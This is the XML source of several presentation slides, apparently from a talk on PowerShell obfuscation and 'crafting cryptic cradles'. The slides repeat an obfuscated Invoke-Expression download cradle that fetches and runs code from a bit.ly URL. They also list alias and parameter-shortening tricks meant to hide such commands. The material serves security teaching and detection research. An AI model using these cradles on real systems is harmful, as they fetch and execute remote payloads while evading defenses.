            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a: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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" b="1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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="113877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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Where-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> {$_.Name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-like</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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5299185"/>
            <a:ext cx="10058400" cy="398951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9" name="Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="8733642" y="3079951"/>
            <a:ext cx="352341" cy="2153687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1435" y="4057596"/>
            <a:ext cx="10058400" cy="378669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10" name="Up Arrow 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="6490009" y="3048290"/>
            <a:ext cx="302538" cy="1009305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46658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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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796239" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a: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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" b="1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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="113877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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7508486" y="3092603"/>
            <a:ext cx="310752" cy="864085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1955179" y="3708836"/>
            <a:ext cx="3598127" cy="120032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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Variable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>_ -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>ValueOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>GV</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Variable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1955179" y="4976634"/>
            <a:ext cx="3581122" cy="120032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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Item</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Variable:_).Value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>GI                             </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>:\_</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Item                        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>:/_</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Up Arrow 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="13525352">
            <a:off x="6374081" y="2632721"/>
            <a:ext cx="352341" cy="2729112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Up Arrow 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="14919091">
            <a:off x="6389427" y="2349804"/>
            <a:ext cx="352341" cy="2026597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5974807" y="4007138"/>
            <a:ext cx="4193788" cy="193899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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>ChildItem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Variable:_).Value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>GCI                                    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>:\_</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>ChildItem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>                        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>:/_</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>DIR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>LS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="482510" y="3190041"/>
            <a:ext cx="1364166" cy="286232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000" b="1" dirty="0" smtClean="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>ValueOnly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>ValueOnl</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>ValueOn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>ValueO</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-Value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Valu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-Val</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Va</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-V</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Circular Arrow 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1003213">
            <a:off x="1552501" y="2561320"/>
            <a:ext cx="3090974" cy="2207945"/>
          </a:xfrm>
          <a:prstGeom prst="circularArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5336"/>
              <a:gd name="adj2" fmla="val 440843"/>
              <a:gd name="adj3" fmla="val 20417577"/>
              <a:gd name="adj4" fmla="val 10800000"/>
              <a:gd name="adj5" fmla="val 6974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33615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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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796239" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" lvl="1">
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Remaining Obfuscation?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="1">
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rearrangement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="685800" lvl="2">
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Logical variable naming &amp; syntax      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>$ds=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="685800" lvl="2">
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Random </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>variable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>naming &amp; syntax   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>SI Variable:/5G2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="1">
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="685800" lvl="2">
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>We will see in the next slides</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="1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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="113877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200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IEX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')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29861005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800" dirty="0"/>
              <a:t>MOAR! Crafting Cryptic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Memory-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Disk-Based</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Methods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Members</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673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64209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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
